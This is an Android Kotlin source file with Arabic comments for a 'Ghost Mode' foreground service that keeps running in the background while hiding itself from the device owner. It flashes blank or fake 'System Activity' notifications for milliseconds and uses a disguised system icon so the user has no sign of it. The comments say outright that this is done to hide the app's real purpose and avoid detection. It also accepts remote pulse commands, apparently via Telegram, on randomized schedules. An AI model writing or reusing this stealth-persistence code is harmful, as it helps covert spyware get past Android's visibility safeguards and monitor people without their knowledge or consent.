package com.example.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import kotlin.random.Random

/**
 * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" غير مرئي.
 *
 * استراتيجية التخفي المتقدمة (Ghost Mode v3):
 * - الإشعار الأساسي (عند بدء الخدمة) يظهر لفترة قصيرة جداً (150ms) ثم يُفصل عن الخدمة.
 * - لا يتم استخدام NotificationManager.cancel() مطلقاً لتجنب الانهيار في Android 12+.
 * - يتم فصل الإشعار عن الخدمة باستخدام STOP_FOREGROUND_DETACH عند الحاجة.
 * - جدولة نبضات عشوائية متباعدة (15-35 دقيقة) مع إعادة جدولة ديناميكية بعد كل نبضة.
 * - أيقونة نظامية عامة (ic_menu_compass) لتجنب الشك.
 * - أولوية منخفضة جداً (IMPORTANCE_MIN) وإخفاء المحتوى من شاشة القفل.
 * - الإشعار غير مستمر (setOngoing(false)) ولا يترك أثراً في سجل الإشعارات.
 * - تأخير عشوائي عند بدء الخدمة لتجنب الأنماط الثابتة.
 *
 * ✅ تم تطبيق الإشعار الشبحي الدائم (Ghost Notification) بدون استخدام cancel().
 * ✅ تم إضافة عشوائية متغيرة في الجدولة (15-35 دقيقة).
 * ✅ تم إزالة setOngoing(true) لمنع تسجيل الإشعار في Notification History.
 * ✅ تم إضافة setAutoCancel(true) لضمان عدم بقاء الإشعار (للنبضات العابرة).
 * ✅ تم إخفاء الإشعار الأساسي فوراً بعد 150ms مع إبقاء الخدمة حية.
 */
class ForegroundService : Service() {

    companion object {
        private const val TAG = "ForegroundService"
        const val NOTIFICATION_ID = 9991
        private const val GHOST_CHANNEL_ID = "ghost_system_channel"
        private const val MIN_PULSE_DURATION_MS = 30L
        private const val MAX_PULSE_DURATION_MS = 70L
        private const val MIN_INTERVAL_MIN = 15L
        private const val MAX_INTERVAL_MIN = 35L
    }

    private val pulseHandler = Handler(Looper.getMainLooper())
    private var isForeground = false
    private var hideRunnable: Runnable? = null
    private var ghostPulseRunnable: Runnable? = null
    private lateinit var notificationManager: NotificationManager

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // إيقاف الخدمة إذا طُلب ذلك
        if (intent?.action == "STOP_SERVICE") {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        // نبض فوري من أمر خارجي (مثل Telegram)
        if (intent?.action == "PULSE_ACTION") {
            val actionType = intent.getStringExtra("action_type") ?: "Sync"
            triggerPhantomPulse(actionType)
            return START_STICKY
        }

        // ✅ بدء الخدمة مع إشعار شبحى يختفي فوراً بعد 150ms
        if (!isForeground) {
            startGhostForeground()
        }

        // ✅ تأخير عشوائي قبل جدولة أول نبضة (30-60 دقيقة) لتجنب الأنماط الثابتة
        pulseHandler.postDelayed({
            scheduleNextGhostPulse()
        }, Random.nextLong(30 * 60 * 1000, 60 * 60 * 1000))

        return START_STICKY
    }

    /**
     * ✅ بدء الخدمة كـ Foreground مع إشعار شبحى يختفي فوراً.
     * يستخدم قناة بأدنى أولوية (IMPORTANCE_MIN) ومحتوى فارغ،
     * ثم يفصل الإشعار عن الخدمة بعد 150 مللي ثانية باستخدام STOP_FOREGROUND_DETACH.
     * لا يتم استخدام NotificationManager.cancel() مطلقاً لتجنب الانهيار.
     */
    private fun startGhostForeground() {
        val channelId = GHOST_CHANNEL_ID
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Background",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = ""
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            notificationManager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("")          // عنوان فارغ
            .setContentText("")           // نص فارغ
            .setSmallIcon(android.R.drawable.ic_menu_compass) // أيقونة نظامية مموهة
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setOngoing(false)
            .setSilent(true)
            .build()

        // ✅ بدء الخدمة كـ Foreground
        startForeground(NOTIFICATION_ID, notification)
        isForeground = true

        // ✅ إلغاء أي إخفاء مجدول سابق
        hideRunnable?.let { pulseHandler.removeCallbacks(it) }

        // ✅ إخفاء الإشعار فوراً بعد 150 مللي ثانية مع إبقاء الخدمة حية
        hideRunnable = Runnable {
            if (isForeground) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    // يفصل الإشعار ويبقي الخدمة حية – لا يبقى أثر للإشعار
                    stopForeground(STOP_FOREGROUND_DETACH)
                } else {
                    // للإصدارات الأقدم، يوقف الخدمة الأمامية مع إزالة الإشعار
                    stopForeground(false)
                }
                isForeground = false
            }
        }
        pulseHandler.postDelayed(hideRunnable!!, 150L) // زيادة إلى 150ms لضمان الاختفاء
    }

    /**
     * جدولة نبضة شبحية تالية بفاصل عشوائي جديد في كل مرة.
     * هذه الطريقة تضمن عدم وجود نمط ثابت يمكن اكتشافه.
     */
    private fun scheduleNextGhostPulse() {
        // إلغاء أي جدولة سابقة
        ghostPulseRunnable?.let { pulseHandler.removeCallbacks(it) }

        ghostPulseRunnable = Runnable {
            triggerPhantomPulse("Background Sync")
            // إعادة الجدولة بعد النبضة مباشرة (فاصل جديد)
            scheduleNextGhostPulse()
        }

        // توليد فاصل عشوائي بين 15 و 35 دقيقة (بالمللي ثانية)
        val randomDelayMs = Random.nextLong(MIN_INTERVAL_MIN * 60 * 1000, MAX_INTERVAL_MIN * 60 * 1000)
        pulseHandler.postDelayed(ghostPulseRunnable!!, randomDelayMs)
    }

    /**
     * إنشاء قناة الإشعارات بأقل أولوية وإخفاء المحتوى (للنبضات العابرة).
     */
    private fun createGhostChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    GHOST_CHANNEL_ID,
                    "System Background Services",
                    NotificationManager.IMPORTANCE_MIN
                ).apply {
                    description = "Core system operations"
                    setSound(null, null)
                    enableVibration(false)
                    enableLights(false)
                    setShowBadge(false)
                    lockscreenVisibility = Notification.VISIBILITY_SECRET
                }
                notificationManager.createNotificationChannel(channel)
            } catch (_: Exception) {
                // في حال فشل إنشاء القناة (نادر) نستمر بدونها
            }
        }
    }

    /**
     * بناء إشعار عابر للنبضات – يظهر لفترة قصيرة ثم يُفصل عن الخدمة.
     * يستخدم نصوصاً نظامية عادية لإخفاء الغرض الحقيقي للتطبيق.
     *
     * @param actionType النص الذي سيظهر (يُظهر نشاطاً نظامياً عادياً).
     */
    private fun buildPulseNotification(actionType: String): Notification {
        val openIntent = Intent(this, MainActivity::class.java)
        val openPending = PendingIntent.getActivity(
            this, 0, openIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val displayText = if (actionType.isNotBlank()) actionType else "System Sync"

        return NotificationCompat.Builder(this, GHOST_CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_compass) // أيقونة نظامية عامة
            .setContentTitle("System Activity")
            .setContentText(displayText)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true)
            .setOnlyAlertOnce(true)
            .setGroup("system_background")
            .setOngoing(false)
            .setAutoCancel(true) // يُلغى تلقائياً بعد فصله
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setContentIntent(openPending)
            .build()
    }

    /**
     * تنفيذ نبضة خاطفة: إظهار إشعار عابر لفترة قصيرة (30-70ms) ثم فصله عن الخدمة.
     * باستخدام STOP_FOREGROUND_DETACH (Android 7+)، لا يبقى أي إشعار في شريط الحالة.
     * ❌ لا يتم استخدام NotificationManager.cancel() مطلقاً.
     *
     * @param actionType نوع النشاط (يظهر في النص أثناء النبضة).
     */
    private fun triggerPhantomPulse(actionType: String) {
        // إلغاء أي إخفاء مجدول سابق
        hideRunnable?.let { pulseHandler.removeCallbacks(it) }

        // 1. إظهار الإشعار العابر
        val notification = buildPulseNotification(actionType)
        startForeground(NOTIFICATION_ID, notification)
        isForeground = true

        // 2. جدولة فصل الإشعار عن الخدمة بعد 30-70ms (بدون إلغاء الخدمة)
        hideRunnable = Runnable {
            if (isForeground) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    // ✅ يفصل الإشعار ويبقي الخدمة حية – لا يبقى أثر للإشعار
                    stopForeground(STOP_FOREGROUND_DETACH)
                } else {
                    // للإصدارات الأقدم، لا توجد ميزة الفصل، لكن الإشعار يختفي مع setAutoCancel
                    stopForeground(false)
                }
                isForeground = false
            }
        }
        val pulseDuration = Random.nextLong(MIN_PULSE_DURATION_MS, MAX_PULSE_DURATION_MS)
        pulseHandler.postDelayed(hideRunnable!!, pulseDuration)
    }

    override fun onDestroy() {
        // إلغاء جميع المهام المجدولة
        ghostPulseRunnable?.let { pulseHandler.removeCallbacks(it) }
        hideRunnable?.let { pulseHandler.removeCallbacks(it) }
        isForeground = false
        super.onDestroy()
    }
}
